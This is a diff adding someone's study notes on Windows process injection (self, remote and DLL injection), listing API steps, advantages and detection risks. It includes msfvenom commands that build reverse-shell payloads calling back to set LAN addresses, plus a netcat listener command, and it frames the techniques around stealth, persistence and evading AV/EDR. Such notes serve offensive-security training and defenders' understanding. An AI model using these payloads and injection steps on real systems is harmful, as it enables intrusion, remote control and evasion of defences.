@@ -1,0 +1,65 @@
+PROCESS INJECTION PART II 
+-Typs of process Injection Techniques we will cover:
+a) Self Injection: Injecting shellcode into the current process
+b) Remote Injection: Injecting shellcode into another running process.
+c)DLL Injection: Injecting a dynamic-link library(DLL) into a target process
+
+
+1. Self Injection
+Self-Injection Involves allocating memory inside the current process and
+executing shellcode within it.
+Used in malware to avoid writing payloads to disk.
+Steps:
+    a. Allocate executable memory using VirtualAlloc.
+    b. Copy the Shellcode into the allocated memory.
+    c. Execute the shellcode using a function pointer.
+Prepairing the Payload:
+-Use Msfvenom to generate reverse shell:
+    kali> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.106 LPORT=8443 -f c 
+-Launch listener and wait for connection. Use Netcat or Metasploit multi handler.
+    kali> nc -lvp 8443
+
+ADVANTAGES:
+A. No need yo inject into another process
+B. Faster execution
+Risks:
+a) Easier to detect since the execution remains within the original process.
+b) Requires privilege escalation for certain operations.(From Shell_to_Meterpreter)
+
+
+2. Remote Injection
+-This is my favorite, involves injecting shellcode into another running process.
+Usefull for privilege escalation and stealth execution.
+Prepairing the Payload
+Steps:
+a. Find te target process(notepad.exe)
+b. Allocate memory in the target process using VirtualAllocEx.
+c. Write shellcode into the allocated memory using WriteProcessMemory.
+d. Create thread in the target process using CreateRemoteThread.
+
+ADVANTAGES:
+a. Code runs inside another process(better stealth)
+b. Useful for persistence Techniques
+c. Scenario: If your initial payload executes inside a short lived process(e.g. word.exe)
+you can migrate it to a more stable process to maintain persistence and avoid losing your session.
+Risks:
+a. Detected by security tools(e.g. VirtualAllocEx, WriteProcessMemory detection)
+
+
+3. DLL Injection
+LoadLibraryA: This function is used to load a specified module(Load DLL dynamycally) into
+the address space of the calling process.
+Prepairing Payload:
+Simplicity we'll use a DLL payload generated with msfvenom
+     kali> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.37.131 LPORT=8443 -f dll -o mylib.dll
+Steps:
+a. Allocate memory for the DLL path in the target process.
+b. Write the DLL path into the allocated memory.
+c. Use CreateRemoteThread to call LoadLibraryA on the injected DLL path.
+ADVANTAGES:
+a. More stable than raw shellcode Injection
+b. Can reuse existing legitimate DLLs for stealth
+Risks:
+a. Writing to another memory can be flagged
+AV/EDR solutions monitor "LoadLibraryA" calls
+
